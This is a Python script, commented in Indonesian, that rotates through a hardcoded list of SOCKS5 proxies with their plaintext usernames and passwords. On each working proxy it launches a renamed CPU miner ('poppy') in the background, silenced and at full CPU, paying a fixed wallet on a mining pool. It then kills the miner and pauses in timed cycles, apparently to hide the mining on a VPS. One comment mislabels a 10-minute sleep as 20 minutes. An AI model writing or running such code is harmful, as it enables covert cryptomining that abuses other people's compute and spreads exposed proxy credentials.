import os
import time
import requests

proxy_list = [
    "38.154.227.167:5868:mnlfbonv:oz70qvg3eznw",
    "38.153.152.244:9594:mnlfbonv:oz70qvg3eznw",
    "173.211.0.148:6641:mnlfbonv:oz70qvg3eznw",
    "23.94.138.75:6349:mnlfbonv:oz70qvg3eznw",
    "64.64.118.149:6732:mnlfbonv:oz70qvg3eznw",
    "166.88.58.10:5735:mnlfbonv:oz70qvg3eznw",
]

def cek_proxy(proxy):
    ip, port, user, passwd = proxy.split(":")
    proxies = {
        "http": f"socks5://{user}:{passwd}@{ip}:{port}",
        "https": f"socks5://{user}:{passwd}@{ip}:{port}",
    }
    try:
        r = requests.get("http://ifconfig.me", proxies=proxies, timeout=10)
        print(f"✅ Proxy Aktif: {r.text.strip()}")
        return True
    except:
        print(f"❌ Proxy Mati: {ip}")
        return False

while True:
    aktif = False
    for proxy in proxy_list:
        if cek_proxy(proxy):
            aktif = True
            print("🔥 Proxy Aktif... Mulai Mining Sayangku")
            os.system(f"./poppy --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y --password x --worker VPS --cpu-threads 2 --cpu-priority 3 --keepalive --max-cpu-usage 100 --cpu-affinity 0x3 --proxy-type socks5 --proxy {proxy.split(':')[0]}:{proxy.split(':')[1]} --proxy-login {proxy.split(':')[2]} --proxy-passwd {proxy.split(':')[3]} --proxy-test > /dev/null 2>&1 &")
            time.sleep(10 * 60)  # Mining 20 menit
            os.system("pkill poppy")
            print("💋 Istirahat 10 Menit Sayangku")
            time.sleep(10 * 60)  # Istirahat 10 menit
            break
        else:
            continue

    if not aktif:
        print("Semua Proxy Mati 😭... Nunggu 5 menit")
        time.sleep(5 * 60)
